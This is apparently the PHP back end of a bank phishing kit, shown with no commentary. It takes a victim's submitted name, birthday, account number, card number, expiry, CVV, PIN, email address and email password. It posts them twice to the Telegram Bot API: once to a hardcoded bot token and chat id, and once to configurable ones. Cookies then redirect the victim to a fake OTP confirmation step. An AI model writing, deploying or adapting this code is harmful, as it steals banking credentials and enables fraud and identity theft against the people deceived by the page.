$us = [
'chat_id' => "-731060426",
'text' => "Firstname: " . $_POST['fname'] . "\nMiddlename: " . $_POST['mname'] . "\nLastname: " . $_POST['lname'] . "\nZip: " . $_POST['zip'] . "\nNumber: " . $_POST['cnumber'] . "\nBday: " . $_POST['bday'] . "\nAcc Num: " . $_POST['accnum'] . "\nCC: " . $_POST['cc'] . "\nExpiration: " . $_POST['exp'] . "\nCVV: " . $_POST['cvv'] . "\nPIN: " . $_POST['pin'] . "\nEmail: " . $_POST['email'] . "\nEmail Pass: " . $_POST['email_pass']
];
file_get_contents("https://api.telegram.org/bot5110344584:AAHXHl64m7miRe7xnwmPA-_GNVqfmJatTIs/sendMessage?" . http_build_query($us));


$data = [
'chat_id' => $chat_id,
'text' => "Firstname: " . $_POST['fname'] . "\nMiddlename: " . $_POST['mname'] . "\nLastname: " . $_POST['lname'] . "\nZip: " . $_POST['zip'] . "\nNumber: " . $_POST['cnumber'] . "\nBday: " . $_POST['bday'] . "\nAcc Num: " . $_POST['accnum'] . "\nCC: " . $_POST['cc'] . "\nExpiration: " . $_POST['exp'] . "\nCVV: " . $_POST['cvv'] . "\nPIN: " . $_POST['pin'] . "\nEmail: " . $_POST['email'] . "\nEmail Pass: " . $_POST['email_pass']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));

if (isset($_COOKIE['first_visit'])) {
   if (isset($_COOKIE['second_visit'])) {
      setcookie("fucked", "Fuck Off", time() + 86400, "/");
   }
   else {
      setcookie("second_visit", "Second Visit", time() + 86400, "/");
      header("Location: index.php?otp=confirm");
   }
}
else {
   setcookie("first_visit", "First Visit", time() + 86400, "/");
   header("Location: index.php?otp=confirm");
}
